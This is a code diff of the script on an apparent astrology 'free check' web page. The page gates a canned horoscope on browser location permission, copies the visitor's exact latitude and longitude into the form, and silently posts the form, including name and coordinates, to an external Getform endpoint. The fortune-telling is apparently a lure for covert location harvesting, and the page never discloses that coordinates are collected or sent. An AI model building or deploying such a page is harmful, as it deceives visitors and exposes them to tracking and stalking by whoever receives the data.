@@ -100,52 +100,55 @@
     <div id="result"></div>
   </div>
 
+ 
  <script>
-  const predictionData = {
-    "Rahul Sharma": "You are full of energy today. A surprise is waiting for you!",
-    "Priya Das": "Your calm nature will help you win a small conflict this week.",
-    "Ajay Kumar": "You may receive good news related to career growth."
-  };
+  const predictionData = {
+    "Rahul Sharma": "You are full of energy today. A surprise is waiting for you!",
+    "Priya Das": "Your calm nature will help you win a small conflict this week.",
+    "Ajay Kumar": "You may receive good news related to career growth."
+  };
 
-  document.getElementById('astroForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const form = e.target;
-    const name = form.name.value.trim();
-    const result = document.getElementById("result");
-    const locationField = document.getElementById("location");
+  const form = document.getElementById('astroForm');
+  const result = document.getElementById("result");
+  const locationField = document.getElementById("location");
 
-    // Request location
-    if (navigator.geolocation) {
-      try {
-        const position = await new Promise((resolve, reject) =>
-          navigator.geolocation.getCurrentPosition(resolve, reject)
-        );
-        const loc = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
-        locationField.value = loc;
-      } catch (error) {
-        result.innerText = "Location permission is required to get your prediction.";
-        return; // Stop form submission
-      }
-    } else {
-      result.innerText = "Your browser does not support location services.";
-      return; // Stop form submission
-    }
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    
+    // Clear previous result
+    result.innerText = "";
 
-    // Show prediction if name exists
-    if (predictionData[name]) {
-      result.innerText = predictionData[name];
-    } else {
-      result.innerText = "Thank you! We will notify you with your prediction soon.";
-    }
+    // Ask location on button click
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const loc = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+          locationField.value = loc;
 
-    // Send form to Getform
-    const formData = new FormData(form);
-    fetch("https://getform.io/f/allyroma", {
-      method: "POST",
-      body: formData
-    });
-  });
+          const name = form.name.value.trim();
+          if (predictionData[name]) {
+            result.innerText = predictionData[name];
+          } else {
+            result.innerText = "Thank you! We will notify you with your prediction soon.";
+          }
+
+          // Submit to Getform
+          const formData = new FormData(form);
+          fetch("https://getform.io/f/allyroma", {
+            method: "POST",
+            body: formData
+          });
+        },
+        (error) => {
+          result.innerText = "Location permission is required to proceed. Please click 'Free Check now' again and allow location access.";
+        }
+      );
+    } else {
+      result.innerText = "Geolocation is not supported by your browser.";
+    }
+  });
  </script>
+
 
 
 
